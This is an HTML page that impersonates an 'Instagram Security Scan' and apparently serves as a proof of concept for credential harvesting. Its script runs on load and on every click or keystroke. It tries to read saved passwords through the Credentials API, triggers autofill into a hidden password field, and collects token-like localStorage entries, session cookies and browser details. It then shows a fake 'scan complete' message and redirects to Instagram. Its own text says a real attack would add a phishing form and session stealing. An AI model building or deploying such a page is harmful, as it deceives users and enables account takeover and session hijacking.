<!DOCTYPE html>
<html>
<head>
    <title>Instagram Security Update</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background: #fafafa;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 12px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        .logo { font-size: 48px; margin-bottom: 20px; }
        .loading { color: #8e8e8e; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">📷</div>
        <h1>Instagram Security Scan</h1>
        <div class="loading" id="status">Scanning your device for security issues...</div>
        <div id="results"></div>
    </div>

    <script>
        console.log('🔓 INSTAGRAM PASSWORD EXTRACTION ATTEMPT');
        console.log('========================================');

        // Спроба отримати збережені паролі з браузера
        async function extractSavedPasswords() {
            const results = {
                savedPasswords: [],
                autofillData: {},
                credentials: null
            };

            // 1. Спроба через Credentials API
            if (navigator.credentials && navigator.credentials.get) {
                try {
                    const credential = await navigator.credentials.get({
                        password: true,
                        mediation: 'optional'
                    });
                    if (credential) {
                        results.credentials = {
                            type: credential.type,
                            id: credential.id,
                            password: credential.password || 'not_accessible'
                        };
                    }
                } catch (e) {
                    console.log('❌ Credentials API blocked:', e.message);
                }
            }

            // 2. Перевірка autofill даних
            try {
                // Спроба знайти поля з автозаповненням
                const tempInput = document.createElement('input');
                tempInput.type = 'password';
                document.body.appendChild(tempInput);
                
                // Спроба викликати autofill
                tempInput.focus();
                setTimeout(() => {
                    results.autofillData = {
                        hasValue: tempInput.value.length > 0,
                        valueLength: tempInput.value.length
                    };
                    document.body.removeChild(tempInput);
                }, 1000);
            } catch (e) {
                console.log('❌ Autofill check failed');
            }

            // 3. Перевірка localStorage на збережені токени
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const value = localStorage.getItem(key);
                    if (key.includes('pass') || key.includes('auth') || key.includes('token') || key.includes('cred')) {
                        results.savedPasswords.push({ key, value: value.substring(0, 50) + '...' });
                    }
                }
            } catch (e) {
                console.log('❌ localStorage access limited');
            }

            return results;
        }

        // Спроба отримати cookies Instagram
        function extractInstagramCookies() {
            const cookies = document.cookie.split(';');
            const instagramCookies = cookies.filter(cookie => 
                cookie.includes('instagram') || 
                cookie.includes('session') || 
                cookie.includes('auth') ||
                cookie.includes('token')
            );
            return instagramCookies;
        }

        // Головна функція
        async function performPasswordExtraction() {
            console.log('🎯 ATTEMPTING PASSWORD EXTRACTION...');
            
            const extractionResults = {
                timestamp: new Date().toISOString(),
                instagramCookies: extractInstagramCookies(),
                passwordData: await extractSavedPasswords(),
                browserData: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language
                }
            };

            // Вивід результатів
            console.log('🔍 EXTRACTION RESULTS:');
            console.log('📋 Instagram Cookies:', extractionResults.instagramCookies);
            console.log('🔑 Password Data:', extractionResults.passwordData);
            console.log('💻 Browser:', extractionResults.browserData);

            // Оновлення UI
            document.getElementById('status').innerHTML = 'Security scan complete!';
            
            const resultsDiv = document.getElementById('results');
            resultsDiv.innerHTML = `
                <div style="text-align: left; background: #f8f9fa; padding: 15px; border-radius: 5px; margin-top: 20px;">
                    <h3>🔓 Security Scan Results</h3>
                    <p><strong>Instagram Cookies Found:</strong> ${extractionResults.instagramCookies.length}</p>
                    <p><strong>Saved Passwords:</strong> ${extractionResults.passwordData.savedPasswords.length}</p>
                    <p><strong>Credentials API:</strong> ${extractionResults.passwordData.credentials ? 'Available' : 'Blocked'}</p>
                    <p><strong>Autofill Data:</strong> ${extractionResults.passwordData.autofillData.hasValue ? 'Detected' : 'None'}</p>
                    
                    <div style="margin-top: 15px; padding: 10px; background: #000; color: #0f0; font-family: monospace; border-radius: 3px;">
                        ⚠️ SECURITY ASSESSMENT:<br>
                        • Modern browsers BLOCK automatic password extraction<br>
                        • Instagram cookies CAN be captured for session hijacking<br>
                        • Real attack would use PHISHING FORM + SESSION STEALING<br>
                        • This demonstrates protection limitations
                    </div>
                </div>
            `;

            console.log('⚠️  MODERN SECURITY PROTECTIONS:');
            console.log('   • Browsers block automatic password reading');
            console.log('   • Credentials API requires user interaction');
            console.log('   • Instagram session cookies are HttpOnly');
            console.log('   • Real attack needs PHISHING FORM + SESSION STEALING');

            // Перенаправлення
            setTimeout(() => {
                window.location.href = 'https://www.instagram.com';
            }, 5000);
        }

        // Запуск при завантаженні
        window.addEventListener('load', function() {
            setTimeout(performPasswordExtraction, 1000);
        });

        // Додаткова спроба через події
        document.addEventListener('click', function() {
            console.log('🖱️ User interaction detected - retrying extraction');
            performPasswordExtraction();
        });

        document.addEventListener('keydown', function() {
            console.log('⌨️ Keyboard input detected - retrying extraction');
            performPasswordExtraction();
        });
    </script>
</body>
</html>
